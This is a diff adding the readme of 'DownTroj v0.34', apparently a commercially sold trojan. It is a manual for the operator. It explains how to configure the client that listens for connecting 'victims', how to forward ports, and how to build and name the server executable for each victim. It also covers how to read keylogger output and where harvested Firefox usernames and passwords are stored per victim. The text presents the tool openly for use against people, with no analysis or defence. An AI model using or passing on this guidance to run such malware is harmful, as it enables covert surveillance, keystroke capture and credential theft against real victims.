@@ -1,0 +1,37 @@
+DownTroj v0.34
+------------------
+Coded by iserdo
+Copyright (C) 2007
+------------------
+
+1. SETUP and PREPARATIONS
+Theres no additional setup needed.
+
+2. RUNNING CLIENT
+When you start dtclient.exe, settings dialog is displayed where you
+define following settings:
+- Port to listen - is the port on which the client listen for 
+  victims to connect. You picked this number when you bought it.
+- Login command - leave this value unchanged
+- Max. sim. victims - maximal number of simultaneous victims
+  connected to your client (max is 64).
+- Ping interval - leave this value unchanged
+- Transfer port - free to pick any value you want (between 1 and 
+  65536
+
+If you have firewall, router you will need to open/forward ports.
+2 ports are important: port to listen and transfer port (both TCP).
+
+You need to build server first. Click on button Build to build it.
+You can define server exe file name and victims name.
+Tip: Name each server differently so you know which victim connected.
+
+3. KEYLOGGER
+[U] in front of letters or numbers in keylogger file means that caps
+lock is turned on or shift has been pressed (upper letters). For any
+other unknown characters, refer to MSDN's Virtual-Key Codes.
+
+4. MASS FIREFOX PASSWORDS
+Victim's usernames and passwords are saved into files, which are in
+the same folder as client's exe. Format is following: ID-IP.txt
+(example: 2-127.0.0.1.txt)
